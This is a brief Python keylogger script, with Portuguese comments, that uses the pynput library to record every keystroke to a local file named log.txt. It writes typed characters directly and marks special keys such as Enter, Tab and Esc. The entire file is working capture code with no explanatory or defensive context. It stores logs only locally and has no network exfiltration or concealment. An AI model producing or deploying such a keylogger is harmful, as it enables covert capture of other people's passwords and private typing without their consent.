from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift_r,
    keyboard.Key.shift_l,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        # se for uma tecla "normal" (letra, número, símbolo)
        with open ("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open ("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f" [{key}] ")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

